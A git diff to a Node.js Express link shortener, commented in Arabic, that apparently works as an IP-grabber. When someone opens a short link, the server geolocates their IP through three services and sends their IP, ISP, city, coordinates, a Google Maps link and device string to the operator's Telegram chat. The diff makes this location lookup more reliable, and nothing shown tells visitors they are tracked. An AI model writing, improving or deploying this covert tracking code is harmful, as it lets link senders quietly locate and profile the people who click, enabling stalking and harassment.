@@ -2,6 +2,7 @@ const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
 const cors = require('cors');
+const geoip = require('geoip-lite');
 require('dotenv').config();
 
 const app = express();
@@ -19,14 +20,89 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
+async function getLocationFromMultipleSources(ip) {
+  let results = {
+    ipwhois: null,
+    ipapi: null,
+    geoiplite: null
+  };
+
+  // الطريقة 1: ipwhois
+  try {
+    const res = await axios.get(`https://ipwhois.app/json/${ip}`, { timeout: 3000 });
+    results.ipwhois = {
+      country: res.data.country,
+      city: res.data.city,
+      region: res.data.region,
+      latitude: res.data.latitude,
+      longitude: res.data.longitude,
+      isp: res.data.isp,
+      type: 'ipwhois'
+    };
+  } catch (err) {
+    console.log('ipwhois error');
+  }
+
+  // الطريقة 2: ip-api.com
+  try {
+    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
+    if (res.data.status === 'success') {
+      results.ipapi = {
+        country: res.data.country,
+        city: res.data.city,
+        region: res.data.regionName,
+        latitude: res.data.lat,
+        longitude: res.data.lon,
+        isp: res.data.isp,
+        type: 'ip-api'
+      };
+    }
+  } catch (err) {
+    console.log('ip-api error');
+  }
+
+  // الطريقة 3: geoip-lite (محلي)
+  try {
+    const geo = geoip.lookup(ip);
+    if (geo) {
+      results.geoiplite = {
+        country: geo.country,
+        city: 'N/A',
+        region: 'N/A',
+        latitude: geo.ll ? geo.ll[0] : 'N/A',
+        longitude: geo.ll ? geo.ll[1] : 'N/A',
+        isp: 'N/A',
+        type: 'geoip-lite'
+      };
+    }
+  } catch (err) {
+    console.log('geoip-lite error');
+  }
+
+  return results;
+}
+
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
   try {
-    // استخدام ipwhois للموقع الدقيق
-    const geoResponse = await axios.get(`https://ipwhois.app/json/${ip}`);
-    const geo = geoResponse.data;
+    const locations = await getLocationFromMultipleSources(ip);
 
-    const lat = geo.latitude || 'N/A';
-    const lng = geo.longitude || 'N/A';
+    // استخدام أفضل مصدر متاح
+    let location = locations.ipwhois || locations.ipapi || locations.geoiplite;
+    
+    if (!location) {
+      location = {
+        country: 'غير معروف',
+        city: 'غير معروف',
+        region: 'غير معروف',
+        latitude: 'N/A',
+        longitude: 'N/A',
+        isp: 'غير معروف',
+        type: 'معلومات غير متاحة'
+      };
+    }
+
+    const lat = location.latitude;
+    const lng = location.longitude;
     const mapsUrl = (lat !== 'N/A' && lng !== 'N/A') 
       ? `https://maps.google.com/?q=${lat},${lng}` 
       : 'N/A';
@@ -35,15 +111,19 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
 🔗 رابط جديد تم فتحه!
 ━━━━━━━━━━━━━━
 📌 الكود: ${shortCode}
-🌐 الرابط الأصلي: ${originalUrl}
+🌐 الرابط: ${originalUrl}
+━━━━━━━━━━━━━━
 🔌 IP Address: ${ip}
-🌍 ISP: ${geo.isp || 'غير معروف'}
-🏳️ الدولة: ${geo.country || 'غير معروف'}
-🏙️ المدينة: ${geo.city || 'غير معروف'}
-🗺️ المنطقة: ${geo.region || 'غير معروف'}
+🌍 ISP: ${location.isp || 'N/A'}
+🏳️ الدولة: ${location.country || 'N/A'}
+🏙️ المدينة: ${location.city || 'N/A'}
+🗺️ المنطقة: ${location.region || 'N/A'}
+━━━━━━━━━━━━━━
 📊 دائرة العرض: ${lat}
 📊 خط الطول: ${lng}
 🗺️ الموقع على الخريطة: ${mapsUrl}
+📡 مصدر البيانات: ${location.type}
+━━━━━━━━━━━━━━
 🖥️ Device: ${userAgent.substring(0, 60)}
 ⏰ الوقت: ${new Date().toISOString()}
   `.trim();
@@ -53,7 +133,7 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
       { chat_id: TELEGRAM_CHAT_ID, text: message }
     );
   } catch (err) {
-    console.error('Error:', err.message);
+    console.error('Telegram error:', err.message);
   }
 }
 
